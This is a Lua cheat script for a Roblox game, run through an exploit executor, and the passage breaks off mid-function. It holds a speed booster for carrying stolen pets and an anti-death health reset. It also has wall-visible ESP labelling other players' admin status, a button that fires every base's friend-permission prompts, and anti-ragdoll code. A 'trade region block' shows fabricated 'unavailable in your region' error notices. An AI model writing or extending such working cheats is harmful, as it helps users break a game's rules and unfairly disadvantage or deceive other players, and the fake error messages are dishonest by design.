local Config = {}
function Config.get(key, fallback)
    local st = Env.DatShawnsScriptsSettings or {}
    if key == "booster_spd" then return tonumber(st.RegularSpeed) or fallback end
    if key == "booster_on" then return st.Regular == true end
    return fallback
end
function Config.set(key, value)
    local st = Env.DatShawnsScriptsSettings
    if not st then return end
    if key == "booster_spd" then
        st.RegularSpeed = value
        if type(Env.DatShawnSetRegularSpeed) == "function" then Env.DatShawnSetRegularSpeed(value); return end
    elseif key == "booster_on" then return end
    if type(Env.DatShawnSaveSettings) == "function" then Env.DatShawnSaveSettings() end
end
local function _FH_IsCarryingPet(player)
    if not player then return false end
    local names = {"Stealing", "steal", "stolen", "isStealing", "IsStealing", "IsSteal", "issteal", "Steal"}
    for _, object in ipairs({player, player.Character}) do
        if object then
            for _, name in ipairs(names) do
                local value = object:GetAttribute(name)
                if value ~= nil and value ~= false and value ~= 0 and value ~= "" then
                    return true
                end
            end
        end
    end
    return false
end
_G._FH_IsCarryingPet = _FH_IsCarryingPet

local Booster = (function()
    local M = {
        enabled     = false,
        userEnabled = false,
        speed       = Config.get("booster_spd", 29.4),
    }

    local _LP = Players.LocalPlayer
    local _suspendKeys = {}
    local _boostConn = nil
    local _carryBoostActive = false

    local character, humanoid, hrp
    local _baseWalkSpeed

    local _linVel, _linVelAtt0, _linVelAtt1, _linVelChar = nil, nil, nil, nil
    local _spoofedVelocity = Vector3.zero

    local function destroyLinVel()
        if _linVel then pcall(_linVel.Destroy, _linVel) end
        if _linVelAtt0 then pcall(_linVelAtt0.Destroy, _linVelAtt0) end
        if _linVelAtt1 then pcall(_linVelAtt1.Destroy, _linVelAtt1) end
        _linVel, _linVelAtt0, _linVelAtt1, _linVelChar = nil, nil, nil, nil
    end

    local function setupLinearVelocity(char)
        destroyLinVel()
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then
            local ok, res = pcall(function() return char:WaitForChild("HumanoidRootPart", 5) end)
            if ok then root = res end
        end
        if not root then return end

        local att0 = Instance.new("Attachment")
        att0.Name = "LinVelAtt0"
        att0.Parent = root

        local att1 = Instance.new("Attachment")
        att1.Name = "LinVelAtt1"
        att1.Parent = root

        local lv = Instance.new("LinearVelocity")
        lv.Name = "LinVel"
        lv.Attachment0 = att0
        lv.Attachment1 = att1
        lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Plane
        lv.PrimaryTangentAxis = Vector3.new(1, 0, 0)
        lv.SecondaryTangentAxis = Vector3.new(0, 0, 1)
        lv.RelativeTo = Enum.ActuatorRelativeTo.World
        lv.MaxForce = 1e6
        lv.PlaneVelocity = Vector2.new(0, 0)
        lv.Parent = root

        _linVel = lv
        _linVelAtt0 = att0
        _linVelAtt1 = att1
        _linVelChar = char
    end

    local function setLinVelXZ(x, z)
        if _linVel and _linVel.Parent then
            pcall(function()
                _linVel.PlaneVelocity = Vector2.new(x, z)
            end)
        end
    end

    local function clearLinVel()
        if _linVel and _linVel.Parent then
            pcall(function()
                _linVel.PlaneVelocity = Vector2.new(0, 0)
            end)
        end
    end

    local function ensureLinVel()
        local char = _LP.Character
        if not char then return false end
        if _linVel and _linVel.Parent and _linVelChar == char then
            return true
        end
        setupLinearVelocity(char)
        return _linVel ~= nil and _linVel.Parent ~= nil
    end

    local _velHooksDone = false
    local function _installVelHooks()

        _velHooksDone = true
    end
    _G._FH_SpoofVel    = function(v) _spoofedVelocity = v end
    _G._FH_GetSpoofVel = function() return _spoofedVelocity end

    local function setupAntiDie(char)
        local hum = char:WaitForChild("Humanoid", 5)
        if not hum then return end

        hum:GetPropertyChangedSignal("Health"):Connect(function()
            if M.enabled and hum.Health < hum.MaxHealth then
                hum.Health = hum.MaxHealth
            end
        end)

        hum.Died:Connect(function()
            if M.enabled then
                task.wait()
                hum.Health = hum.MaxHealth
            end
        end)

        pcall(function()
            game:GetService("StarterGui"):SetCore("ResetButtonCallback", false)
        end)
    end

    local function applyBoost()
        character = _LP.Character
        if not character then
            return false
        end

        humanoid = character:FindFirstChildOfClass("Humanoid")
        hrp = character:FindFirstChild("HumanoidRootPart")

        if not humanoid or not hrp then
            return false
        end

        _baseWalkSpeed = humanoid.WalkSpeed
        humanoid.WalkSpeed = M.speed

        setupLinearVelocity(character)
        setupAntiDie(character)

        return true
    end

    local function removeBoost()
        clearLinVel()
        destroyLinVel()

        if humanoid and humanoid.Parent then
            if _baseWalkSpeed ~= nil then humanoid.WalkSpeed = _baseWalkSpeed end
        end
        _baseWalkSpeed = nil
        pcall(function()
            game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
        end)
    end

    M.regularSpeed = M.speed
    M.giantMode = false
    M.setEffectiveSpeed = function(n, giantMode)
        M.speed = tonumber(n) or M.speed
        M.giantMode = giantMode == true
        if M.enabled and _carryBoostActive and humanoid then humanoid.WalkSpeed = M.speed end
    end
    M.setSpeed = function(n)
        M.regularSpeed = tonumber(n) or M.regularSpeed
        Config.set("booster_spd", M.regularSpeed)
        if not M.giantMode then M.setEffectiveSpeed(M.regularSpeed, false) end
    end

    local function _startLoop()
        if _boostConn then _boostConn:Disconnect(); _boostConn = nil end
        _installVelHooks()
        _carryBoostActive = false

        local HEIGHT_GAP_STUDS = 1.2
        local LOOKAHEAD_STUDS  = 6
        local rayParams = RaycastParams.new()
        rayParams.FilterType = Enum.RaycastFilterType.Exclude

        local function groundY(pos, char)
            rayParams.FilterDescendantsInstances = { char }
            local result = workspace:Raycast(pos + Vector3.new(0, 3, 0), Vector3.new(0, -15, 0), rayParams)
            return result and result.Position.Y or nil
        end

        _boostConn = RunService.RenderStepped:Connect(function() 
            if not M.enabled then return end

            local char = _LP.Character
            if not char then
                if _carryBoostActive then removeBoost(); _carryBoostActive = false end
                return
            end
            local hum = char:FindFirstChildOfClass("Humanoid")
            local root = char:FindFirstChild("HumanoidRootPart")
            if not hum then return end

            if _G._NeptuneInvisWalking then
                if _carryBoostActive then removeBoost(); _carryBoostActive = false end
                return
            end
            local carrying = _FH_IsCarryingPet(_LP)
            if not carrying then
                if _carryBoostActive then
                    removeBoost()
                    _carryBoostActive = false
                end
                return
            end

            if not _carryBoostActive then
                if not applyBoost() then return end
                _carryBoostActive = true
                char = _LP.Character
                hum = char and char:FindFirstChildOfClass("Humanoid")
                root = char and char:FindFirstChild("HumanoidRootPart")
                if not hum or not root then return end
            end

            ensureLinVel()

            local md = hum.MoveDirection

            if md.Magnitude > 0.05 then
                local effectiveSpeed = M.speed
                if M.speed > 29 and root then
                    local flatDir = Vector3.new(md.X, 0, md.Z)
                    if flatDir.Magnitude > 0.01 then
                        flatDir = flatDir.Unit
                        local lookahead = math.clamp(LOOKAHEAD_STUDS * (M.speed / 30), LOOKAHEAD_STUDS, LOOKAHEAD_STUDS * 2)
                        local currentY = groundY(root.Position, char)
                        local aheadY = groundY(root.Position + flatDir * lookahead, char)
                        if currentY and aheadY and math.abs(aheadY - currentY) > HEIGHT_GAP_STUDS then
                            effectiveSpeed = 28.4
                        end
                    end
                end
                setLinVelXZ(md.X * effectiveSpeed, md.Z * effectiveSpeed)
            else
                clearLinVel()
            end
        end)
    end

    local function _stopLoop()
        if _boostConn then _boostConn:Disconnect(); _boostConn = nil end
        removeBoost()
        _carryBoostActive = false
    end

    local function onCharacterAdded(char)
        character = char
        humanoid = char:WaitForChild("Humanoid")
        hrp = char:WaitForChild("HumanoidRootPart")

        task.wait(0.5)

        if M.enabled and _FH_IsCarryingPet(_LP) then
            applyBoost()
            _carryBoostActive = true
            pcall(function()
                game:GetService("StarterGui"):SetCore("ResetButtonCallback", false)
            end)
        else
            _carryBoostActive = false
        end
    end

    _LP.CharacterAdded:Connect(onCharacterAdded)
    if _LP.Character then
        task.spawn(onCharacterAdded, _LP.Character)
    end

    M.set = function(v)
        M.userEnabled = v and true or false
        Config.set("booster_on", M.userEnabled)
        local _susp = false
        for _ in pairs(_suspendKeys) do _susp = true; break end
        M.enabled = M.userEnabled and not _susp
        if M.enabled then _startLoop() else _stopLoop() end
    end
    M.suspend = function(key)
        _suspendKeys[key or "_"] = true
        M.enabled = false
        _stopLoop()

        pcall(function()
            local char = _LP.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if root then
                local v = root.AssemblyLinearVelocity
                root.AssemblyLinearVelocity = Vector3.new(0, v.Y, 0)
            end
        end)
    end
    M.unsuspend = function(key)
        _suspendKeys[key or "_"] = nil
        for _ in pairs(_suspendKeys) do return end
        M.enabled = M.userEnabled
        if M.userEnabled then _startLoop() end
    end
    return M
end)()

Env.DatShawnNeptuneBooster = Booster
Env.DatShawnBoosterSet = function(enabled) Booster.set(enabled) end
Env.DatShawnBoosterSetSpeed = function(speed) Booster.setSpeed(speed) end
Env.DatShawnBoosterSync = function(enabled, speed, giantMode)
    if Booster.giantMode ~= (giantMode == true) or Booster.speed ~= speed then
        Booster.setEffectiveSpeed(speed, giantMode)
    end
    if Booster.userEnabled ~= (enabled == true) then Booster.set(enabled) end
end
Booster.set(Config.get("booster_on", false))

]====]))()

-- Isolated Allow Base panel.
;(loadstring([====[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer
task.spawn(function()
local GUI = LP:WaitForChild("PlayerGui"):WaitForChild("DatShawnsScriptsGUI", 20)
if not GUI then return end

local function readState(path, fallback)
    if type(isfile) == "function" and type(readfile) == "function" and isfile(path) then
        local ok, data = pcall(function() return HttpService:JSONDecode(readfile(path)) end)
        if ok and type(data) == "table" then return data end
    end
    return fallback
end
local function writeState(path, value)
    if type(writefile) == "function" then pcall(writefile, path, HttpService:JSONEncode(value)) end
end
local function corner(object, radius)
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, radius or 7); c.Parent = object
end
local function waitForDescendant(name, timeout)
    local deadline = os.clock() + (timeout or 20)
    repeat
        local object = GUI:FindFirstChild(name, true)
        if object then return object end
        task.wait(0.1)
    until os.clock() >= deadline or not GUI.Parent
    return nil
end

-- Allow Base launcher in the UTILS page plus its compact Faded-style panel.
local utils = waitForDescendant("UtilsPage", 20)
if utils then
    utils.CanvasSize = UDim2.fromOffset(0, 565)
    local row = Instance.new("Frame")
    row.Name = "AllowBaseRow"; row.Size = UDim2.new(1,0,0,40); row.Position = UDim2.fromOffset(0,414)
    row.BackgroundColor3 = Color3.fromRGB(23,25,34); row.BorderSizePixel = 0; row.Parent = utils; corner(row,9)
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1,-70,1,0); label.Position = UDim2.fromOffset(12,0); label.BackgroundTransparency = 1
    label.Text = "Allow Base Panel"; label.TextColor3 = Color3.fromRGB(235,235,245); label.TextSize = 11
    label.Font = Enum.Font.GothamBold; label.TextXAlignment = Enum.TextXAlignment.Left; label.Parent = row
    local toggle = Instance.new("TextButton")
    toggle.Size = UDim2.fromOffset(50,28); toggle.Position = UDim2.new(1,-56,0,6); toggle.TextColor3 = Color3.new(1,1,1)
    toggle.TextSize = 9; toggle.Font = Enum.Font.GothamBold; toggle.Parent = row; corner(toggle,6)
    local state = readState("DatShawn_AllowBase.json", {visible=false, position={0.5,-260,0.5,180}})
    if type(state.position) ~= "table" or #state.position ~= 4 then state.position = {0.5,-260,0.5,180} end
    local panel = Instance.new("Frame")
    panel.Name = ""; panel.Size = UDim2.fromOffset(134,72)
    panel.Position = UDim2.new(tonumber(state.position[1]) or .5, tonumber(state.position[2]) or -260,
        tonumber(state.position[3]) or .5, tonumber(state.position[4]) or 180)
    panel.BackgroundColor3 = Color3.fromRGB(15,13,25); panel.BorderSizePixel = 0; panel.Active = true; panel.Draggable = true
    panel.Visible = state.visible == true; panel.Parent = GUI; corner(panel,10)
    local lockEnv = getgenv and getgenv() or _G
    panel.Draggable = lockEnv.DatShawnGlobalGuiLocked ~= true
    RunService.Heartbeat:Connect(function()
        if panel and panel.Parent then
            panel.Draggable = lockEnv.DatShawnGlobalGuiLocked ~= true
        end
    end)
    local positionRevision = 0
    panel:GetPropertyChangedSignal("Position"):Connect(function()
        positionRevision += 1
        local revision = positionRevision
        task.delay(0.3, function()
            if revision ~= positionRevision or not panel.Parent then return end
            local position = panel.Position
            state.position = {position.X.Scale, position.X.Offset, position.Y.Scale, position.Y.Offset}
            writeState("DatShawn_AllowBase.json", state)
        end)
    end)
    local heading = Instance.new("TextLabel")
    heading.Size = UDim2.new(1,-12,0,26); heading.Position = UDim2.fromOffset(8,2); heading.BackgroundTransparency = 1
    heading.Text = "ALLOW BASE"; heading.TextColor3 = Color3.new(1,1,1); heading.TextSize = 10
    heading.Font = Enum.Font.GothamBold; heading.TextXAlignment = Enum.TextXAlignment.Left; heading.Parent = panel
    local fire = Instance.new("TextButton")
    fire.Size = UDim2.new(1,-16,0,32); fire.Position = UDim2.fromOffset(8,32); fire.BackgroundColor3 = Color3.fromRGB(88,62,175)
    fire.Text = "ALLOW"; fire.TextColor3 = Color3.new(1,1,1); fire.TextSize = 10; fire.Font = Enum.Font.GothamBold; fire.Parent = panel; corner(fire,7)
    local function repaint()
        toggle.Text = panel.Visible and "ON" or "OFF"
        toggle.BackgroundColor3 = panel.Visible and Color3.fromRGB(88,62,175) or Color3.fromRGB(48,52,68)
    end
    toggle.MouseButton1Click:Connect(function()
        panel.Visible = not panel.Visible; state.visible = panel.Visible
        writeState("DatShawn_AllowBase.json", state); repaint()
    end)
    fire.MouseButton1Click:Connect(function()
        local plots = workspace:FindFirstChild("Plots")
        if not plots or type(fireproximityprompt) ~= "function" then return end
        for _, plot in ipairs(plots:GetChildren()) do
            local friendPanel = plot:FindFirstChild("FriendPanel", true)
            local main = friendPanel and friendPanel:FindFirstChild("Main")
            if main then
                for _, object in ipairs(main:GetDescendants()) do
                    if object:IsA("ProximityPrompt") then pcall(fireproximityprompt, object) end
                end
            end
        end
    end)
    repaint()
end
end)
]====]))()

local function promptKey(prompt)
	return tostring(prompt)
end

-- ESP
local ESPPlayerConnections = {}

local function findStat(player, names)
	local leaderstats = player:FindFirstChild("leaderstats")
	for _, name in ipairs(names) do
		local value = leaderstats and leaderstats:FindFirstChild(name)
		if value and value:IsA("ValueBase") then return value.Value end
		local attribute = player:GetAttribute(name)
		if attribute ~= nil then return attribute end
	end
end

local function hasAdmin(player)
	for _, object in ipairs({player, player.Character,
		player.Character and player.Character:FindFirstChild("HumanoidRootPart"),
		player.Character and player.Character:FindFirstChildOfClass("Humanoid"),
		player.Character and player.Character:FindFirstChild("Head")}) do
		if object and object:GetAttribute("AdminCommands") == true then return true end
	end
	return false
end

local function removeESP(character)
	if not character then return end
	local highlight = character:FindFirstChild("PlayerESPHighlight")
	if highlight then highlight:Destroy() end
	local head = character:FindFirstChild("Head")
	local tag = head and head:FindFirstChild("PlayerESPTag")
	if tag then tag:Destroy() end
end

local function addESP(player, character)
	if not State.ESP or player == LP then return end
	local head = character:WaitForChild("Head", 5)
	if not head or not State.ESP then return end
	removeESP(character)
	local highlight = Instance.new("Highlight")
	highlight.Name = "PlayerESPHighlight"
	highlight.Adornee = character
	highlight.FillColor = Color3.fromRGB(255, 35, 35)
	highlight.FillTransparency = 0.55
	highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
	highlight.OutlineTransparency = 0
	highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
	highlight.Parent = character
	local billboard = Instance.new("BillboardGui")
	billboard.Name = "PlayerESPTag"
	billboard.Adornee = head
	billboard.Size = UDim2.fromOffset(260, 58)
	billboard.StudsOffset = Vector3.new(0, 3.15, 0)
	billboard.AlwaysOnTop = true
	billboard.MaxDistance = 500
	billboard.Parent = head
	local label = Instance.new("TextLabel")
	label.Name = "NameLabel"
	label.Size = UDim2.fromScale(1, 1)
	label.BackgroundTransparency = 1
	label.TextColor3 = Color3.fromRGB(255, 75, 75)
	label.TextStrokeColor3 = Color3.new(0, 0, 0)
	label.TextStrokeTransparency = 0.15
	label.Font = Enum.Font.FredokaOne
	label.TextSize = 14
	label.TextWrapped = true
	label.Parent = billboard
	local rebirth = findStat(player, {"Rebirths", "Rebirth"})
	label.Text = string.format("%s (@%s)\nAdmin Panel: %s | Rebirth: %s",
		player.DisplayName, player.Name, hasAdmin(player) and "YES" or "NO", rebirth ~= nil and tostring(rebirth) or "?")
end

local function setupESPPlayer(player)
	if player == LP or ESPPlayerConnections[player] then return end
	ESPPlayerConnections[player] = player.CharacterAdded:Connect(function(character)
		task.spawn(addESP, player, character)
	end)
	if player.Character then task.spawn(addESP, player, player.Character) end
end

local function disableESP()
	for _, player in ipairs(Players:GetPlayers()) do removeESP(player.Character) end
	for player, connection in pairs(ESPPlayerConnections) do
		connection:Disconnect()
		ESPPlayerConnections[player] = nil
	end
end

local function enableESP()
	for _, player in ipairs(Players:GetPlayers()) do setupESPPlayer(player) end
end

-- Exact SAB Base Timer + Base Allow ESP (from supplied source)
local BaseTimerBoards = {}
local BaseAllowBoards = {}
local UNALLOWED_IMAGE = "rbxassetid://110783679426495"

local function clearBoardPool(pool)
	for key, data in pairs(pool) do
		if data.Gui then data.Gui:Destroy() end
		pool[key] = nil
	end
end

local function clearBaseESP()
	clearBoardPool(BaseTimerBoards)
	clearBoardPool(BaseAllowBoards)
end

local function timerAnchor(label, plots)
	local anchor = label.Parent
	while anchor and not anchor:IsA("BasePart") do
		anchor = anchor.Parent
		if anchor == plots or anchor == nil then break end
	end
	if anchor and anchor:IsA("BasePart") then return anchor end
	local model = label:FindFirstAncestorOfClass("Model")
	return model and (model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart", true)) or nil
end

local function getTimerBoard(key, adornee)
	local data = BaseTimerBoards[key]
	if not data or not data.Gui or data.Gui.Parent == nil then
		if data and data.Gui then pcall(function() data.Gui:Destroy() end) end
		local billboard = Instance.new("BillboardGui")
		billboard.Name = "DatShawnTimerESP"
		billboard.ResetOnSpawn = false
		billboard.Size = UDim2.fromOffset(140, 36)
		billboard.StudsOffset = Vector3.new(0, 2.2, 0)
		billboard.AlwaysOnTop = true
		billboard.LightInfluence = 0
		billboard.MaxDistance = math.huge
		billboard.Parent = PlayerGui
		local label = Instance.new("TextLabel")
		label.Size = UDim2.fromScale(1, 1)
		label.BackgroundTransparency = 1
		label.Font = Enum.Font.FredokaOne
		label.TextSize = 22
		label.TextColor3 = Color3.new(1, 1, 1)
		label.TextStrokeColor3 = Color3.new(0, 0, 0)
		label.TextStrokeTransparency = 0.2
		label.Parent = billboard
		data = {Gui = billboard, Label = label, Used = false}
		BaseTimerBoards[key] = data
	end
	data.Gui.Adornee = adornee
	return data
end

local function getAllowBoard(key, adornee)
	local data = BaseAllowBoards[key]
	if not data or not data.Gui or data.Gui.Parent == nil then
		if data and data.Gui then pcall(function() data.Gui:Destroy() end) end
		local billboard = Instance.new("BillboardGui")
		billboard.Name = "DatShawnBaseAllowESP"
		billboard.ResetOnSpawn = false
		billboard.Size = UDim2.fromOffset(36, 36)
		billboard.StudsOffset = Vector3.new(0, 4.4, 0)
		billboard.AlwaysOnTop = true
		billboard.LightInfluence = 0
		billboard.MaxDistance = math.huge
		billboard.Parent = PlayerGui
		local label = Instance.new("TextLabel")
		label.Size = UDim2.fromScale(1, 1)
		label.BackgroundColor3 = Color3.new(0, 0, 0)
		label.BackgroundTransparency = 0
		label.Font = Enum.Font.FredokaOne
		label.TextSize = 32
		label.TextStrokeTransparency = 0.4
		label.Parent = billboard
		Instance.new("UICorner", label).CornerRadius = UDim.new(1, 0)
		local stroke = Instance.new("UIStroke", label)
		stroke.Thickness = 1.5
		stroke.Color = Color3.new(0, 0, 0)
		data = {Gui = billboard, Label = label, Used = false}
		BaseAllowBoards[key] = data
	end
	data.Gui.Adornee = adornee
	return data
end

local function refreshBaseESP()
	if not State.BaseESP then clearBaseESP(); return 0 end
	local plots = workspace:FindFirstChild("Plots")
	if not plots then clearBaseESP(); return 0 end

	for _, data in pairs(BaseTimerBoards) do data.Used = false end
	for _, data in pairs(BaseAllowBoards) do data.Used = false end

	local detectedPlots = {}
	for _, plot in ipairs(plots:GetChildren()) do
		-- Exact Timer ESP source: every TextLabel/TextBox named RemainingTime.
		for _, object in ipairs(plot:GetDescendants()) do
			if object.Name == "RemainingTime" and (object:IsA("TextLabel") or object:IsA("TextBox")) then
				local text = (object.ContentText ~= "" and object.ContentText)
					or (object.Text ~= "" and object.Text) or nil
				local anchor = text and timerAnchor(object, plots) or nil
				if text and anchor then
					local data = getTimerBoard(object, anchor)
					data.Label.Text = text
					data.Gui.Enabled = true
					data.Used = true
					detectedPlots[plot] = true
				end
			end
		end

		-- Exact Base Allow source: FriendPanel/Main/SurfaceGui/ImageLabel.
		local panel = plot:FindFirstChild("FriendPanel")
		if panel then
			local part = (panel:IsA("BasePart") and panel)
				or (panel:IsA("Model") and panel.PrimaryPart)
				or panel:FindFirstChildWhichIsA("BasePart", true)
			local main = panel:FindFirstChild("Main")
			local surfaceGui = main and main:FindFirstChild("SurfaceGui")
			local image = surfaceGui and surfaceGui:FindFirstChild("ImageLabel")
			if part and image and image:IsA("ImageLabel") then
				local unallowed = image.Image == UNALLOWED_IMAGE
				local data = getAllowBoard(plot, part)
				data.Label.Text = unallowed and "X" or "✓"
				data.Label.TextColor3 = unallowed
					and Color3.fromRGB(240, 60, 60)
					or Color3.fromRGB(60, 230, 110)
				data.Gui.Enabled = true
				data.Used = true
				detectedPlots[plot] = true
			end
		end
	end

	for key, data in pairs(BaseTimerBoards) do
		if not data.Used then
			data.Gui.Enabled = false
			if typeof(key) == "Instance" and key.Parent == nil then
				data.Gui:Destroy()
				BaseTimerBoards[key] = nil
			end
		end
	end
	for key, data in pairs(BaseAllowBoards) do
		if not data.Used then
			data.Gui.Enabled = false
			if typeof(key) == "Instance" and key.Parent == nil then
				data.Gui:Destroy()
				BaseAllowBoards[key] = nil
			end
		end
	end

	local count = 0
	for _ in pairs(detectedPlots) do count += 1 end
	return count
end

-- Anti-Ragdoll (replacement standalone implementation, connected to this hub's toggle/keybind)
if _G.__AntiRagdollCleanup then pcall(_G.__AntiRagdollCleanup) end
State.AntiRagdoll = true
Settings.AntiRagdoll = true

local AntiRagdollModule = (function()
	local M = {heartbeat = nil, characterAdded = nil}

	local function resetCharacter(character)
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		local root = character and character:FindFirstChild("HumanoidRootPart")
		if not humanoid or not root or humanoid.Health <= 0 then return end
		pcall(function()
			humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
			humanoid:ChangeState(Enum.HumanoidStateType.Running)
			root.Velocity = Vector3.zero
			root.RotVelocity = Vector3.zero
			root.Velocity = Vector3.zero
			root.Velocity = Vector3.zero
			humanoid.PlatformStand = false
			humanoid.Sit = false
			humanoid.AutoRotate = true
			humanoid.JumpPower = humanoid.JumpPower > 0 and humanoid.JumpPower or 50
			humanoid.WalkSpeed = humanoid.WalkSpeed > 0 and humanoid.WalkSpeed or 16
			for _, object in ipairs(character:GetDescendants()) do
				if object:IsA("Motor6D") then
					object.Enabled = true
				elseif object:IsA("Constraint") or object:IsA("BallSocketConstraint") or object:IsA("HingeConstraint") then
					object.Enabled = true
				elseif object:IsA("BasePart") then
					-- Preserve the hub's ceiling head-phase behavior. Do not force
					-- every limb collidable during recovery.
					if object.Name == "Head" then object.CanCollide = false end
					object.Velocity = Vector3.zero
					object.Velocity = Vector3.zero
				end
			end
			workspace.CurrentCamera.CameraSubject = humanoid
			local playerModule = LP.PlayerScripts:FindFirstChild("PlayerModule")
			local controlModule = playerModule and playerModule:FindFirstChild("ControlModule")
			if controlModule then
				local success, module = pcall(require, controlModule)
				if success and module and module.Enable then module:Enable() end
			end
		end)
	end

	function M.start()
		if M.heartbeat or not State.AntiRagdoll then return end
		local checkAccumulator = 0
		M.heartbeat = RunService.Heartbeat:Connect(function(dt)
			if not State.AntiRagdoll or Env._FH_LAUNCHING then return end
			checkAccumulator += dt
			if checkAccumulator < 0.05 then return end
			checkAccumulator = 0
			local character = LP.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			if not humanoid then return end
			local head = character:FindFirstChild("Head")
			if head and head:IsA("BasePart") then head.CanCollide = false end
			local state = humanoid:GetState()
			if state == Enum.HumanoidStateType.Physics
				or state == Enum.HumanoidStateType.Ragdoll
				or state == Enum.HumanoidStateType.FallingDown
				or state == Enum.HumanoidStateType.Dead
				or humanoid.PlatformStand == true
				or humanoid.Sit == true then
				resetCharacter(character)
			end
		end)
	end

	function M.stop()
		if M.heartbeat then pcall(function() M.heartbeat:Disconnect() end); M.heartbeat = nil end
	end

	function M.cleanup()
		M.stop()
		if M.characterAdded then pcall(function() M.characterAdded:Disconnect() end); M.characterAdded = nil end
		_G.__AntiRagdollCleanup = nil
	end

	M.characterAdded = LP.CharacterAdded:Connect(function()
		task.wait(0.5)
		if State.AntiRagdoll then M.start() end
	end)
	_G.__AntiRagdollCleanup = M.cleanup
	return M
end)()

local function startAntiRagdoll()
	AntiRagdollModule.start()
end

local function stopAntiRagdoll()
	AntiRagdollModule.stop()
end

local function setAntiRagdollEnabled(enabled)
	State.AntiRagdoll = enabled and true or false
	if State.AntiRagdoll then startAntiRagdoll() else stopAntiRagdoll() end
	saveSettings()
end

-- Trade Region Block, adapted from the supplied full source.
local TradeRegionBlock = (function()
	local M = {enabled = false}
	local overlays, badge = {}, nil
	local watchToken = 0
	local NOTE = "Trading is not available in your region."

	local function findLabel(object)
		if object:IsA("TextButton") or object:IsA("TextLabel") then return object end
		return object:FindFirstChildWhichIsA("TextLabel", true)
	end

	local function dim(color)
		local h, s, v = Color3.toHSV(color)
		return Color3.fromHSV(h, s * 0.15, math.min(v * 0.55, 0.32))
	end

	local function restore(owner)
		local data = overlays[owner]
		if not data then return end
		pcall(function()
			data.button.BackgroundColor3 = data.background
			data.button.AutoButtonColor = data.auto
			data.button.Active = data.active
		end)
		if data.label and data.text ~= nil then
			pcall(function() data.label.Text = data.text; data.label.TextColor3 = data.textColor end)
		end
		for _, object in ipairs({data.blocker, data.note, data.banner}) do
			if object then pcall(function() object:Destroy() end) end
		end
		overlays[owner] = nil
	end

	local function clear()
		for owner in pairs(overlays) do restore(owner) end
		if badge then pcall(function() badge:Destroy() end); badge = nil end
	end

	local function block(owner, buttonObject, confirmation)
		if not M.enabled or overlays[owner] or not buttonObject:IsA("GuiButton") then return end
		local label = findLabel(buttonObject)
		local data = {
			button = buttonObject, label = label,
			background = buttonObject.BackgroundColor3,
			auto = buttonObject.AutoButtonColor, active = buttonObject.Active,
			text = label and label.Text, textColor = label and label.TextColor3,
		}
		overlays[owner] = data
		buttonObject.AutoButtonColor = false
		buttonObject.Active = false
		buttonObject.BackgroundColor3 = dim(data.background)
		if label then
			label.Text = confirmation and "🔒 Unavailable" or "Unavailable"
			label.TextColor3 = Color3.fromRGB(160, 160, 170)
		end
		local blocker = Instance.new("TextButton")
		blocker.Name = "DatShawnTradeRegionBlocker"
		blocker.Size = UDim2.fromScale(1, 1)
		blocker.BackgroundTransparency = 1
		blocker.Text = ""
		blocker.Active = true
		blocker.AutoButtonColor = false
		blocker.ZIndex = buttonObject.ZIndex + 50
		blocker.Parent = buttonObject
		data.blocker = blocker
		local note = Instance.new("TextLabel")
		note.Name = "DatShawnRegionNote"
		note.AnchorPoint = Vector2.new(0.5, 0)
		note.Position = UDim2.new(0.5, 0, 1, 2)
		note.Size = UDim2.new(1, -4, 0, 12)
		note.BackgroundTransparency = 1
		note.Text = NOTE
		note.TextColor3 = Color3.fromRGB(140, 140, 150)
		note.TextSize = 10
		note.Font = Enum.Font.FredokaOne
		note.TextTruncate = Enum.TextTruncate.AtEnd
		note.ZIndex = buttonObject.ZIndex + 5
		note.Parent = buttonObject
		data.note = note
		if confirmation then
			local prompt = buttonObject.Parent
			while prompt and prompt.Name ~= "Prompt" do prompt = prompt.Parent end
			if prompt then
				local banner = Instance.new("TextLabel")
				banner.Name = "DatShawnRegionWarning"
				banner.Size = UDim2.new(1, -16, 0, 50)
				banner.Position = UDim2.new(0, 8, 0, 8)
				banner.BackgroundColor3 = Color3.fromRGB(28, 29, 34)
				banner.Text = "⚠  Trade Unavailable\nTrading is unavailable in your region due to local restrictions. (Error Code: 280)"
				banner.TextColor3 = Color3.fromRGB(225, 226, 232)
				banner.TextSize = 11
				banner.TextWrapped = true
				banner.Font = Enum.Font.FredokaOne
				banner.ZIndex = prompt.ZIndex + 10
				banner.Parent = prompt
				Instance.new("UICorner", banner).CornerRadius = UDim.new(0, 8)
				data.banner = banner
			end
		end
	end

	local function scan()
		local root = PlayerGui:FindFirstChild("TradePlayerList")
		local inner = root and root:FindFirstChild("TradePlayerList")
		local sections = inner and inner:FindFirstChild("Sections")
		local playersSection = sections and sections:FindFirstChild("Players")
		local list = playersSection and playersSection:FindFirstChild("List")
		if list then
			for _, frame in ipairs(list:GetChildren()) do
				if frame:IsA("GuiObject") then
					local fill = frame:FindFirstChild("Fill")
					local send = fill and fill:FindFirstChild("Send")
					if send then block(frame, send, false) end
					if not badge then
						local name = frame:FindFirstChildWhichIsA("TextLabel", true)
						if name and (name.Text == LP.Name or name.Text == LP.DisplayName) then
							badge = Instance.new("TextLabel")
							badge.Name = "DatShawnRegionLockBadge"
							badge.Size = UDim2.fromOffset(116, 18)
							badge.Position = UDim2.new(1, 4, 0.5, -9)
							badge.BackgroundColor3 = Color3.fromRGB(42, 45, 54)
							badge.Text = "Region Restricted"
							badge.TextColor3 = Color3.fromRGB(190, 194, 205)
							badge.TextSize = 10
							badge.Font = Enum.Font.FredokaOne
							badge.ZIndex = frame.ZIndex + 10
							badge.Parent = frame
							Instance.new("UICorner", badge).CornerRadius = UDim.new(0, 4)
						end
					end
				end
			end
		end
		local prompts = PlayerGui:FindFirstChild("TradePrompts")
		local prompt = prompts and prompts:FindFirstChild("Prompt")
